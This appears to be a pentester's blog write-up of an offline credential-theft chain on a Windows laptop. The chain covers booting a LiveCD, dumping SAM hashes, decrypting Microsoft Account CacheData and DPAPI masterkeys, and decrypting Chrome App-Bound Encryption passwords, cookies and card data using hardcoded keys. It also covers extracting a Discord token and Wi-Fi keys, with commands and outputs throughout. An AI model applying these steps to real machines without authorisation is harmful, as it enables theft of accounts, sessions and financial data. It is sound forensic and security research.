---
layout: post
title: "Physical Pentest : From the Login Screen to Full Compromise"
date: 2026-09-15
categories: [security, research]
tags: [red team, windows, dfir, cachedata, msa, app-bound-encryption, browser-forensics, chrome-decryption]
author: 
description: "A follow-up technical deep-dive for DFIR practitioners and pentesters, covering a masterkey rotation fix for Chrome's offline decryption and MSA CloudAP CacheData decryption."
---

![](/assets/img/preview.png){: .shadow }

> **Disclaimer**: This article is intended for information security research and educational purposes only. The techniques presented must be used exclusively on systems that you own or for which you have explicit authorization.

---

## Introduction

This article documents a personal exploration of physical pentesting, inspired by a real **Red Team** operation that I carried out: starting from a simple login screen, through an endless bruteforce, and finally ending up deep in Windows' **DPAPI** mechanism, followed by everything that comes with it.

The starting point was simple: start from a Windows login screen and manage to retrieve the PC's disk in order to extract its data onto a USB drive, to carry out a fully **offline** forensic analysis.

---

## 1. Physical Access to the System

The first step of a physical pentest is to assess the robustness of the protections upstream of the operating system itself: **Secure Boot**, disk encryption, and **BIOS/UEFI** configuration. In this specific case, none of these protections were enabled — a scenario that is still very common on corporate workstations, particularly in small IT services companies (ESNs), or more broadly within local government bodies (town halls, etc.).

### 1.1 BIOS/UEFI Access and Boot Order Modification

By restarting the machine and intercepting the POST (pressing `F2`, `F12`, `Del` or `Esc` depending on the manufacturer), you get access to the **BIOS**.
The goal here is simple: modify the **boot order** to prioritize booting from a bootable USB drive rather than the internal disk.

![](/assets/img/bios.jpg)
*Figure 1: BIOS set to boot from USB CD-ROM first.*

Two critical elements made this step trivial:

- The **BIOS** was not password-protected, which leaves full access to the boot configuration.
- **Secure Boot** was disabled, which allows booting any `UEFI` executable, signed or not, including a Linux LiveCD not signed by Microsoft.

### 1.2 Booting Debian LiveCD and Mounting the NTFS Partition

Once the boot order has been changed, we boot from the Debian USB drive in Live mode. The advantage of a **LiveCD** is that it runs entirely in RAM, without touching the internal disk, is portable, and gives full root access to a Linux environment.

Once inside the environment, we identify the internal disk's partitions to locate the main Windows `NTFS` partition, create a mount point, and mount the partition:

![](/assets/img/mount_ntfs.png)
*Figure 2: Mounting the Windows NTFS partition from the LiveCD.*

**Why this works: the absence of BitLocker!**

This is where the real flaw lies: without **BitLocker** (or any other disk-level encryption), the contents of the `NTFS` partition are stored in plaintext on the physical media. The `ntfs-3g` driver, natively present on most Linux distributions, allows full read (and write) access to this partition without any authentication required.

> BitLocker remains the most effective deterrent, but not an absolute one: **TPM sniffing** attacks, documented by several researchers, allow the BitLocker key to be intercepted on the `LPC`/`SPI` bus at boot time with physical access to the motherboard. In practice, this remains a hardware attack that requires equipment and time.
{: .prompt-info }

At this stage, we have total, complete access to absolutely everything that can exist on a Windows system: system files, configuration, and above all the entirety of the sessions of every user account that has ever logged into the machine — profiles, personal files, settings, histories, associated application data... **Absolutely everything.**

A quick look at the disk's directory tree:

```bash
drwxrwxrwx 1 root root      12288 Jun  7  2025 '$Recycle.Bin'
drwxrwxrwx 1 root root          0 Nov 21  2025 '$WINDOWS.~BT'
drwxrwxrwx 1 root root          0 Nov 21  2025 '$Windows.~WS'
-rwxrwxrwx 1 root root        112 Jan 10  2021  bootTel.dat
drwxrwxrwx 1 root root     655360 Sep  9 23:16  Config.Msi
drwxrwxrwx 1 root root          0 May  7  2025  DownLoadiTunes
-rwxrwxrwx 2 root root      12288 Oct 10  2025  DumpStack.log
-rwxrwxrwx 2 root root      12288 Sep 10 11:43  DumpStack.log.tmp
drwxrwxrwx 1 root root          0 Nov 21  2025  ESD
-rwxrwxrwx 1 root root 3358330880 Sep 10 11:43  hiberfil.sys
drwxrwxrwx 1 root root          0 Sep  1  2025  inetpub
drwxrwxrwx 1 root root          0 May  8  2025  Log
drwxrwxrwx 1 root root          0 Nov 24  2021  Logs
-rwxrwxrwx 1 root root 3623878656 Sep 10 11:43  pagefile.sys
drwxrwxrwx 1 root root          0 Apr  1  2024  PerfLogs
drwxrwxrwx 1 root root      16384 Sep  5 07:32  ProgramData
drwxrwxrwx 1 root root      16384 Sep  5 21:14 'Program Files'
drwxrwxrwx 1 root root      12288 Sep  8 14:13 'Program Files (x86)'
drwxrwxrwx 1 root root       4096 Sep  2  2025  Recovery
drwxrwxrwx 1 root root          0 Oct 12  2025  RecoveryWSL
-rwxrwxrwx 1 root root   16777216 Sep 10 11:43  swapfile.sys
drwxrwxrwx 1 root root       8192 Sep 10 12:34 'System Volume Information'
drwxrwxrwx 1 root root          0 Jun  9 15:48  Temp
drwxrwxrwx 1 root root       4096 Oct 15  2025  Users
drwxrwxrwx 1 root root      28672 Sep  9 23:15  Windows
drwxrwxrwx 1 root root      12288 Sep 18  2022  xampp
```

---

## 2. Local Hash Extraction (SAM)

One of the first things to test on a copy of a Windows disk remains a classic: extracting the local hashes stored in the `SAM` database, protected by the system key present in the `SYSTEM` hive, using Impacket:

```bash
$ secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xb2481da406218049e5d69d9c871821c8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrateur:500:aae7b435b51404bbaad3b435b51404ee:31d6cfb0d16ae931b73c58d7e0c019c0:::
Invité:501:aad3b435b51401eeaad3b435c31404eb:31f7cfc0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b491b51404egaad3b645b51404ee:31d6cae1d16ae811b73c59d9e0c089c0:::
WDAGUtilityAccount:504:aad3b435b58404eeaad3d92b51405ee:30e35f5b78ed72e74ad21fa9d892f5f8:::
goten:1001:3e3e338becf7731862434ef735dc4d93:d3ff98bd0da32ff3a457e29584fe6844:::
WsiAccount:1055:aed3b465b54404eeaad3b435b51494ee:08970ae20ef72ab4609b1a8d5ae0f913:::
[*] Cleaning up…
```
{: .nolineno }

The **NTLM** hash `d3ff98bd0da32ff3a457e29584fe6844` corresponds to the targeted user (`goten`). After a long bruteforce, the plaintext password is recovered: `Freecss66*`.
After testing, the recovered password turned out to be exactly the same as the one used for the **Microsoft Account (MSA)** linked to this Windows user. This recovered Microsoft password will come in handy a little further on, since it will be essential for the next step: decrypting the **DPAPI Master Key**.

---

## 3. Offline DPAPI Masterkey Decryption from a TPM-Protected MSA Account

To my knowledge, there is no public technical documentation detailing the decryption of a **DPAPI masterkey** linked to a **Microsoft Account (MSA)**, nor more generally the **offline** decryption of CloudAP's **MSA CacheData** file — existing resources cover either local accounts or Entra ID accounts, systematically leaving aside the MSA + active TPM case that this section documents.

### 3.1 How DPAPI Works and the Role of the Masterkey

On Windows, **DPAPI (Data Protection API)** is the mechanism used by an impressive number of features to encrypt sensitive data: Chrome, Edge, Brave, and Opera credentials, Wi-Fi identifiers, Windows Credential Manager, certificates, and many others.
Concretely, each secret protected by DPAPI (a "DPAPI blob") is not encrypted directly with the user's password, but with an intermediate key called a **masterkey**, which is itself stored on disk, encrypted, in the folder:

```
C:\Users\<User>\AppData\Roaming\Microsoft\Protect\<SID_user>\
```

In our case:

```
\S-1-5-21-1165040952-93560433-1993425277-1001\

03bb0530-1139-4d7c-8fac-38e61418f8df
0c850636-8454-4552-bc2f-c403660ea707
0f6bbc6d-f70d-472f-90be-8331a5fab0a1
1ab0619c-c30f-4b9c-b262-6710dce02096
1ef05572-ecc5-498f-8815-4d14859ded3b
26799fdd-9730-4763-9e58-762c12914c6f
3999d0aa-4f87-474d-b175-4a0f312a4105
5d7c4930-68b9-4768-aaf9-26a7dc622d3e
70673d8e-daf9-436c-9f60-97273d7af462
74bd7ec3-f04b-4c98-9345-1c07e6fd2661
779e092c-6142-4b37-a75f-98ef4e16437b
835518d3-41b7-49ff-bd3f-08687adcc6ec
8904f43e-a3ce-434f-9f2b-e949889638aa
97252261-688d-4b6e-a139-3fec892f087e
acc714ee-ef04-4a37-812c-7a17a8d31b4d
b24aa0fe-fb17-4374-835a-083aa0ee1d01
ba12808c-9f23-4cf4-b377-087709f61778
bea7193c-71ed-4c7d-8cac-2d516c574a1d
d6f5db40-8ffb-495b-9c4c-d5582219f367
d8771e2f-d135-4472-9e60-4f8ec8734b88
d8945b74-5241-4eff-8a65-43cdc831c8c4
e2fc0f82-c680-4bde-be01-73b017aa07fd
f5bfc14e-57b4-4555-97a5-ae153a8ad09c
fffdaf8d-fb03-42b5-ab89-950dcfbd1f9c
Preferred
```

> The `Preferred` file identifies the MasterKey currently used by the system; its first 16 bytes contain the `GUID` of this MasterKey. Windows periodically generates a new MasterKey, roughly every 90 days, while keeping the old ones so it can continue decrypting previously protected data.
{: .prompt-info }

To decrypt a DPAPI blob, you therefore need two ingredients: the blob itself (which references the `GUID` of the masterkey used, visible in its header) and the corresponding decrypted masterkey.
The whole difficulty of the topic comes down to a simple question: how do you decrypt this masterkey?

### 3.2 Domain, Local, or Microsoft: Three Masterkey Recovery Scenarios

Digging into the topic, we come across three radically different scenarios:

1. **Active Directory domain account**: There is a recovery mechanism via the **Domain Backup Key**, held by the DC. However, this requires (even indirect) access to the domain infrastructure and therefore does not constitute a purely offline scenario.

2. **100% local Windows account**: the simple case — the masterkey is encrypted with the `SHA1` of the account password.

3. **Local account linked to a Microsoft account** — this is the scenario found on a lot of PCs today, both for individuals and businesses. There are two variants, which rely on the same mechanism (`cloudAP.dll`) but differ slightly in the details:

   - **Personal Microsoft account (MSA)** — an *@outlook.com*, *@hotmail.com* account, or even a Gmail/other address registered as a Microsoft identifier. This is the case for the targeted workstation, and the subject of this article.

   - **Entra ID work/school account** (formerly Azure AD) — the way it works is broadly similar, but the file path changes (`CloudAPCache\AzureAD\`{: .filepath } instead of `CloudAPCache\MicrosoftAccount\`{: .filepath }), and above all, as we'll see later, the internal structure of the **CacheData** file differs enough between the two that the same tools don't necessarily work on both types of caches, particularly for MSA accounts.

> To identify, from a Windows disk, whether a user's account is an MSA or Entra ID account, you just need to check the following path: `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\CloudAPCache\MicrosoftAccount\<unique_hash>\Cache\CacheData` for an MSA account. `\Local\Microsoft\Windows\CloudAPCache\AzureAD\<unique_hash>\Cache\CacheData` for an Entra ID account.
{: .prompt-info }

**The MSA account trap**

On an MSA account, neither the session **PIN** nor the plaintext **Microsoft account password** is used directly to derive the key that protects the masterkey. Windows actually generates a random secret specific to DPAPI, stored on disk, which is itself protected by a different mechanism depending on the login method used by the user: either **NGC/Windows Hello** (PIN), or the **CacheData/CloudAP** file (Microsoft password).

To draw a parallel with a 100% local account: on such an account, this random secret is directly the account password; on an MSA/Entra ID account, you have to recover it by going through an additional cryptographic layer.

### 3.3 First Approach: NGC/Windows Hello and the TPM Wall

The **NGC (Next Generation Credentials)** mechanism is the one used by Windows Hello to allow a session to be unlocked with a simple PIN. The decryption chain, documented in detail by Tijl Deneut (author of [dpapilab-ng](https://github.com/tijldeneut/dpapilab-ng)) in [this article](https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/), works as follows:

- Parsing the NGC folder (`Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc`)
- Decryption of a first private `RSA` blob via DPAPI, using the System masterkeys, the `SYSTEM`/`SECURITY` hives, and the PIN (derived with `PBKDF2-SHA256`, 10,000 iterations)
- This first `RSA` decrypts a "`DecryptPIN`"
- This `DecryptPIN` is used to repeat the operation for a second `RSA` blob
- This second `RSA` this time decrypts an `AES` key
- This `AES` key is used, together with an IV and an encrypted password retrieved from the **Windows Vault** (itself protected by DPAPI via the System masterkey), to perform a final `AES-CBC` decryption and obtain the plaintext password

![](/assets/img/DPAPI-NG.png)
*Figure 3: Password decryption with [DPAPI-NG](https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/)*

Two tools implement this chain: [_ngc_full_auto.py](https://github.com/tijldeneut/dpapilab-ng/blob/main/_ngc_full_auto.py) and [diana-ngcpinpassdec.py](https://github.com/tijldeneut/diana/blob/main/diana-ngcpinpassdec.py). I tested both, with every combination of the necessary files retrieved from the full disk copy:

```
Windows/System32/config/{SOFTWARE,SYSTEM,SECURITY}
Windows/System32/Microsoft/Protect/S-1-5-18/User/
Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/
Windows/ServiceProfiles/LocalService/AppData/Roaming/Microsoft/Crypto/Keys/
Windows/System32/config/systemprofile/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28
```

The result, systematically:

```
[-] Protector "1" is probably being stored in the TPM chip.
```

![](/assets/img/meme.png)

This is a well-known and documented wall: when a **TPM** is active, the private key that protects the PIN is no longer stored in a file accessible on disk but is physically sealed inside the chip. It is impossible to extract offline, only via an online session (`ngc::pin` from `Mimikatz`, which queries the TPM directly).

### 3.4 Second Approach: CacheData/CloudAP — MSA & Entra ID

Digging further, we come across the work of Synacktiv, presented at [Troopers 2024](https://www.synacktiv.com/sites/default/files/2024-07/troopers2024_sayhellotoyournewcacheflow.pdf), which documents a second mechanism that is totally independent of the TPM: the **CacheData** file managed by **CloudAP**, used by Windows to enable offline authentication when the PC cannot reach the Microsoft/Entra ID servers.

In an **Entra ID** cache, what's notably stored is a **PRT (Primary Refresh Token)**, an artifact that allows reconnection even while offline.
In an **MSA** cache, there is no PRT as such: it's the **`Passport.NET`** artifact, inherited from the old Microsoft Passport system, that plays the same role.

The CacheData file contains one or more "nodes", each corresponding to an authentication method (PIN or password). The node of type password (`0x1`) is decrypted via this derivation, which is the same whether it's an MSA or Entra ID account:

```
key = PBKDF2-HMAC-SHA256(password, empty salt, 10000 iterations, 32 bytes)
decrypted_data = AES-256-CBC-Decrypt(encrypted_blob, key, null IV)
```

I tested the tool developed by Synacktiv, [decrypt_cachedata.py](https://github.com/synacktiv/CacheData_decrypt/):

```bash
$ python3 decrypt_cachedata.py password -C CacheData -P password.txt
[+] CacheData node of type password (0x1) has been found
[+] End of bruteforce, no valid password found.
```
{: .nolineno }

Looking at the code, the reason is simple: the script validates the password by looking for a specific `JSON` string in the decrypted blob:

```python
idx = decrypted_blob.find(b'{"Version"')
if idx == -1:
    continue  # password rejected
```

This JSON is the `PRT`, present in an **Entra ID** cache, absent from an **MSA** cache. The script therefore systematically rejects the correct password, since it never finds what it's looking for.

An initial script already existed to specifically handle MSA accounts, [diana-msaccountdec.py](https://github.com/tijldeneut/diana/blob/main/diana-msaccountdec.py) by Tijl Deneut, but its original version (2022) is unable to handle a recent Entra ID / MSA cache.

I found an updated version (2024) by Laxa of [this same script](https://github.com/laxaa/diana/blob/main/diana-msaccountdec.py) that implements the correct decryption logic for both types of caches:

```python
if b'Version' in bClearData:
    # Entra ID branch: the PRT is there, in JSON format
    version, flags, dword3, raw_dpapi_cred_key_size = struct.unpack("<IIII", bClearData[0:0x10])
    decrypted_prt = bClearData[0x70:]
    dpapi_cred_key_blob = bClearData[0x10:0x10 + raw_dpapi_cred_key_size]
    dpapi_cred_key_blob_obj = DPAPICredKeyBlob(dpapi_cred_key_blob)
    decrypted_prt_end = decrypted_prt.rfind(b'}')
    decrypted_prt = decrypted_prt[:decrypted_prt_end + 1]
    key = hashlib.sha1(dpapi_cred_key_blob_obj.CredKey).digest()
    j = json.loads(decrypted_prt)
    sid = j['UserInfo']['PrimarySid']
    encoded_sid = (sid + '\0').encode('UTF-16-LE')
    key = hmac.new(key, encoded_sid, hashlib.sha1).hexdigest()
    # extraction of the CredKey (GUID + 64 bytes), then derivation via SHA1 + HMAC with the SID taken from the JSON
else:
    # MSA branch: no PRT, the password is directly in plaintext
    ## DPAPI Password should be at offset 48, length 88 bytes
    sPassword = bClearData[48:136].decode('UTF-16LE')
```

This is the version I used, and it worked: no **`"Version"`** found in the cache -> automatic fallback to the MSA branch.

![](/assets/img/cachedata_diag.png)
*Figure 4: CacheData (CloudAP) decryption workflow — MSA & Entra ID. (Click to zoom)*

Time to decrypt the `MSA Cache`:

```bash
$ python3 diana-msaccountdec.py -f CacheData -p "Freecss66*"
```
{: .nolineno }

![](/assets/img/cachedata.png)
*Figure 5: Decrypting a CacheData file.*


### 3.5 Masterkey Decryption Using the DPAPI Secret

With the **DPAPI secret** in hand, time to decrypt the Masterkey:

```bash
$ dpapi.py masterkey -file 70673d8e-daf9-436c-9f60-97273d7af462 -password '<SecretDPAPI>' -sid S-1-5-21-1165040952-93560433-1993425277-1001

Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 70673d8e-daf9-436c-9f60-97273d7af462
Flags       :        5 (5)
Policy      :     7ffe (32766)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with User Key (SHA1)
Decrypted key: 0xa6a8f687baf3c133e126a1f4288c36bda5f63c0cf1d630391214f4eb9440fcd5ac861aaecbf9bc07b281bd688446481ec0fdcf61bebdf3712760ed9faf51250e
```
{: .nolineno }

We have finally managed to decrypt offline a user **DPAPI MasterKey** associated with a **Microsoft (MSA)** account protected by a **TPM**, by going through CloudAP's **CacheData**.

This result thus demonstrates that a TPM-protected MSA/Entra ID account does not constitute an obstacle to a fully offline DPAPI decryption, as long as the necessary CloudAP artifacts are available on the system.

---

## 4. Offline Chrome Credentials Decryption

A few reference implementations guided me: [Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption), [runassu/chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption), and [aabston/chrome-decrypt-offline](https://github.com/aabston/chrome-decrypt-offline) mainly served as the basis for understanding the v20 chain.

Chrome credentials can be protected by two main mechanisms: `v10`, the old encryption mechanism, and `v20`, the new mechanism based on **App-Bound Encryption (ABE)**, recently put in place.

### 4.1 Before Chrome 127 — v10 Model

Chrome stored its **AES** key in `Local State`, field `os_crypt.encrypted_key` — a simple user DPAPI blob prefixed with the string `"DPAPI"`. The full offline chain:

```
Local State → base64 decode → strip "DPAPI" (5 bytes) → standard DPAPI blob
→ user masterkey (password + SID) → 32-byte AES key (browser key)
→ Login Data (SQLite) → entries prefixed "v10"
→ AES-256-GCM decrypt: [v10 (3b)] [IV (12b)] [ciphertext] [GCM tag (16b)]
→ plaintext password
```

Fundamental problem with `v10`: any process running under the user account could call `CryptUnprotectData` via the Windows DPAPI API and obtain the **Browser key** (AES 256 key) without needing the password, without anything at all — every infostealer exploited this.

### 4.2 v20 Model — App-Bound Encryption (Chrome 127+ — July 2024)

Google added a new field in `Local State`: `os_crypt.app_bound_encrypted_key`, prefixed `"APPB"`. The two fields coexist:

```js
{
  "os_crypt": {
    "encrypted_key": "DPAPI...", // v10, always present
    "app_bound_encrypted_key": "APPB..." // v20, added since Chrome 127
  }
}
```
{: .nolineno }

The prefix in the first bytes of each piece of encrypted data, whether it's passwords/cookies (`Login Data`) or banking data (`Web Data`), indicates which path to take: `v10` points to `encrypted_key`, `v20` points to the entire **App-Bound** chain.

```
encrypted data = [v10 or v20 (3b)] [IV (12b)] [ciphertext] [TAG (16b)]
```

> Chrome never re-encrypts old encrypted data when it updates; a password saved under **Chrome 120** stays in `v10` even on **Chrome 127+**.
Any data that Chrome encrypts can be prefixed with either `v10` or `v20` depending on the version of Chrome active at the time it was saved. This is the case here, with a Chrome profile that has existed for several years.
{: .prompt-info }

### 4.3 The v20 Chain: Two DPAPI Layers Common to All Flags

```
app_bound_encrypted_key
→ strip "APPB"
→ blob1: decrypted with SYSTEM masterkey
→ blob2: decrypted with user masterkey
→ content = [flag (1b)] [data depending on flag]
```

Once `blob2` is decrypted, the first byte of the content indicates which method Chrome used to encrypt the final **browser key**.
There are three possible values, corresponding to three generations of the protection.

### 4.4 Flags 1, 2 and 3: Evolution of the Protection

**Flag=1 (Chrome 127-132)**

```
[flag=1 (1b)] [IV (12b)] [TAG (16b)] [ciphertext]
→ AES-256-GCM with a universal key hardcoded in elevation_service.exe
```

```python
key = bytes.fromhex(
    "B31C6E241AC846728DA9C1FAC4936651"
    "CFFB944D143AB816276BCC6DA0284787"
)
browser_key = AES.new(key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct, tag)
```
{: .nolineno }

**Flag=2 (Chrome 133-136)**

```
[flag=2 (1b)] [IV (12b)] [TAG (16b)] [ciphertext]
→ ChaCha20-Poly1305 with a universal key hardcoded in elevation_service.exe
```

```python
key = bytes.fromhex(
    "E98F37D7F4E1FA433D19304DC2258042"
    "090E2D1D7EEA7670D41F738D08729660"
)
browser_key = ChaCha20_Poly1305.new(key=key, nonce=iv).decrypt_and_verify(ct, tag)
```
{: .nolineno }

The problem with **`flag 1`** and **`flag 2`**: the hardcoded key extracted from the `elevation_service.exe` binary via reverse engineering and publicly published was identical across all Chrome installations for a given version — it only had to be found once → the key was exposed for **hundreds of millions** of machines simultaneously.
The two DPAPI layers were still there, but this last universally breakable step made the whole scheme fragile.

**Flag=3 (Chrome 137+, the case that interests us)**

```
[flag=3 (1b)] [enc_key (32b)] [IV (12b)] [ciphertext (32b)] [TAG (16b)]
```

No more universal key — `enc_key` is encrypted with a key unique to each machine, stored in Windows' **Key Storage Provider (KSP)**:

```
KSP file "Google Chromekey1" (C:\ProgramData\Microsoft\Crypto\SystemKeys)
→ DPAPI SYSTEM + entropy "xT5rZW5qVVbrvpuA\x00"
→ ksp_key (32 bytes at offset 12)
→ AES-CBC(ksp_key, null IV).decrypt(enc_key) → key1
→ key1 XOR xor_key → key2
→ AES-256-GCM(key2, IV).decrypt(ciphertext) → browser key
```

The `xor_key` is a 32-byte constant, universal and hardcoded in `elevation_service.exe`, found (again) via reverse engineering:

```python
xor_key = bytes.fromhex(
    "CCF8A1CEC56605B8517552BA1A2D061C"
    "03A29E90274FB2FCF59BA4B75C392390"
)
```
{: .nolineno }

![](/assets/img/xor_key.png)
*Figure 6: XOR loop in elevation_service.exe with hardcoded constants — key1 XOR xor_key → key2*

And the entropy `xT5rZW5qVVbrvpuA` is the same constant used in the **DPAPI-NG Decrypt RSA Private Key** derivation from the **NGC** diagram at the start of the article! That's where the `SHA512` of the PIN is combined with this string to decrypt the RSA private key. Microsoft clearly reuses it in several places throughout the system.

The real difference between the three flags lies solely in this last step:

| Flag | Protection mechanism | Result |
|------|----------------------|--------|
| `flag=1` **(Chrome 127-132)** | Hardcoded universal key (AES-GCM) | Browser Key |
| `flag=2` **(Chrome 133-136)** | Hardcoded universal key (ChaCha20) | Browser Key |
| `flag=3` **(Chrome 137+)** | Machine-unique `ksp_key` (AES-CBC + XOR) | Browser Key |

![](/assets/img/browser_diag.png)
*Figure 7: Chrome v10 & v20 offline decryption workflow. (Click to zoom)*

### 4.5 When Does app_bound_encrypted_key Actually Get Rewritten?

The DPAPI blob `encrypted_key` (v10) is created only once, when the Chrome profile is initialized, and is **permanently** protected by the user masterkey active **on that day**. It never changes (except on a complete profile reset, or Chrome reinstallation).

`app_bound_encrypted_key` (v20) can be regenerated, but very rarely: every time Chrome evolves its protection mechanism (a flag change), the `elevation_service` requests that the new protection method be applied.

The mechanism is documented directly in the Chromium source code:

```
// https://chromium.googlesource.com/chromium/src/+/36e5343a18a8864e696dddba73e4078863db3f5c/chrome/browser/os_crypt/app_bound_encryption_win.h
// App-Bound may recommend re-encryption of the data, for example if the key
// has been rotated. If so, new_ciphertext will contain the re-encrypted
// data according to the protection_level specified.
```

Concretely, every time Chrome launches, `OSCryptAsync` triggers the decryption of `app_bound_encrypted_key` to obtain **the v20 Browser Key**, which, for performance reasons, is then kept in memory for the entire session (it's used for a huge number of things: decrypting cookies, auto-filling credentials/banking data...). It is at this exact moment that the elevation_service can return a `kSuccessShouldReencrypt` code, a signal indicating that the protection flag needs to change. If this code is received, Chrome immediately calls `EncryptData()` again to rewrite `app_bound_encrypted_key` under the new mechanism:


```cpp
// https://chromium.googlesource.com/chromium/src/+/5e1e7ebbc540905089d602ae3ebb51a63232df0e/chrome/browser/os_crypt/app_bound_encryption_win.cc
  if (base::FeatureList::IsEnabled(features::kAppBoundDataReencrypt) &&
      hr == elevation_service::Elevator::kSuccessShouldReencrypt) {
    DWORD encrypt_last_error;
    base::win::ScopedBstr reencrypted_data;
    if (flags) {
      protection_level = AddFlags(protection_level, *flags);
    }
    HRESULT encrypt_hr =
        elevator->EncryptData(protection_level, plaintext_data.Get(),
                              reencrypted_data.Receive(), &encrypt_last_error);
```

Chrome then recreates the nested DPAPI blobs (blob1 + blob2) and re-encrypts the Browser Key with the new flag. The SYSTEM and USER masterkeys used are the ones active at the time of this operation.

**In summary, what you need (offline case, Chrome 137+):**

| File | Path |
|------|------|
| SYSTEM | `Windows/System32/config/SYSTEM` |
| SECURITY | `Windows/System32/config/SECURITY` |
| SYSTEM Masterkey | `Windows/System32/Microsoft/Protect/S-1-5-18/User/<GUID>` |
| User masterkey | `Users/<user>/AppData/Roaming/Microsoft/Protect/<SID>/<GUID>` |
| KSP ChromeKey1 *(Specific to v20 flag=3)* | `ProgramData/Microsoft/Crypto/SystemKeys/<hexdigits>_<guid>` |
| Local State | `Users/<user>/AppData/Local/Google/Chrome/User Data/Local State` |
| Login Data | `Users/<user>/AppData/Local/Google/Chrome/User Data/Default/Login Data` |
| Cookies | `Users/<user>/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies` |
| Web Data | `Users/<user>/AppData/Local/Google/Chrome/User Data/Default/Web Data` |

---

### 4.6 PoC Execution on Chrome 155

You can find the [PoC implementation](https://github.com/0rcruxe/chrome-abe-offline-decrypt), covering the decryption of standard credentials (passwords, cookies) as well as banking data stored by Chrome (card numbers, CVC, IBAN).

**Prerequisites:** before starting, you first need to obtain the DPAPI system secret from the `SECURITY` AND `SYSTEM` hives in order to decrypt the system masterkey:

![](/assets/img/secret_sys.png)
*Figure 8: Dumping DPAPI_SYSTEM secrets.*

With all the necessary data in hand, it is now possible to decrypt the Chrome credentials:

```bash
python3 chrome_abe_offline_decrypt.py --decrypt -s "Local State" -l "Login Data" -c "Cookies" -w "Web Data"'
```
{: .nolineno }

![](/assets/img/credentials.png)
![](/assets/img/credentials2.png)
*Figure 9: Offline-decrypted Chrome credential.*

> Some entries in `Login Data` may not contain any credentials. When a user chooses "Never save" during a login attempt on a site, Chrome creates an entry that only serves to remember that choice (**`blacklisted_by_user = 1`**) for the site, with no username or password saved.
{: .prompt-info }

---

## 5. Chrome Local Storage Inspection (LevelDB)

**Local Storage** is a standard JavaScript API, available in all browsers. It's a simple key-value storage space that each website chooses whether or not to use in its own JS code. Authentication tokens (`JWT`, `OAuth`) are often found there, but also pretty much any kind of data the site wants to keep client-side — it can represent a real goldmine.
This data is stored in: `\Users\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb\`

It's possible to read these artifacts, and the mechanism is completely different from the way Chrome encrypts the data seen previously — they are stored in plaintext but in **LevelDB** format, which requires a parser to be read. There are a few such as [crush-forensics](https://github.com/kalink0/crush-forensics) or [ccl_chromium_reader](https://github.com/cclgroupltd/ccl_chromium_reader).

To illustrate all this with a concrete example, I'm going to look for a well-known example of a token stored this way: Discord's.

![](/assets/img/auth_token.png)
*Figure 10: Extracting a Discord auth token from a LevelDB file.*

---

## 6. Wi-Fi Credentials Decryption (WLAN)

On Windows, the first time you connect to a Wi-Fi network, the system saves (via the `Wlansvc` service) the credentials within a global Wi-Fi profile in the form of an `XML` file used to automate future connections.
Each network has its own unique, distinct file: `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\*.xml`

This `.xml` file contains:

- The `SSID` (the Wi-Fi name) in plaintext.
- The password, stored in the `<keyMaterial>` field. It is encrypted as a DPAPI blob with the machine's SYSTEM masterkey, and it can be decrypted with the `wifidec.py` tool from `dpapilab-ng`.

**Required files:**

| File | Path |
|------|------|
| Wi-Fi profiles (WLAN) | `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\*.xml` |
| SYSTEM Masterkey | `\System32\Microsoft\Protect\S-1-5-18\` |
| `SECURITY` AND `SYSTEM` hives | `Windows/System32/config/SYSTEM & SECURITY` |

```bash
$ python3 wifidec.py --system SYSTEM --security SECURITY --masterkey /S-1-5-18/User/<GUID> {85BCEBD9-8FF7-4C43-B8FA-DE64A6884347}/{9760A75B-3B43-4F26-BDE3-2FF0442F2C28}.xml

[+] SSID:     Freebox-16FE7540
    Password: fB7xQ2mL9kR4pT8z
```
{: .nolineno }

---

## 7. Conclusion

Ultimately, everything starts from a login screen. From there, it's a real exploitation chain: disk access, extraction of **SAM** hashes, decryption of the **MSA CacheData** to recover the **DPAPI** secret, decryption of the **Masterkey**, and finally a full dump of Chrome credentials — passwords, cookies, and banking data protected by Google's **App-Bound Encryption**.

---

## 8. References

- [https://www.synacktiv.com/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow](https://www.synacktiv.com/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/](https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/)
- [https://github.com/tijldeneut/diana/pull/3/](https://github.com/tijldeneut/diana/pull/3/)
- [https://github.com/laxaa/diana/blob/main/diana-msaccountdec.py](https://github.com/laxaa/diana/blob/main/diana-msaccountdec.py)
- [https://github.com/tijldeneut/dpapilab-ng/blob/main/_ngc_step_by_step_on_and_offline.py](https://github.com/tijldeneut/dpapilab-ng/blob/main/_ngc_step_by_step_on_and_offline.py)
- [https://github.com/synacktiv/CacheData_decrypt](https://github.com/synacktiv/CacheData_decrypt)
- [https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
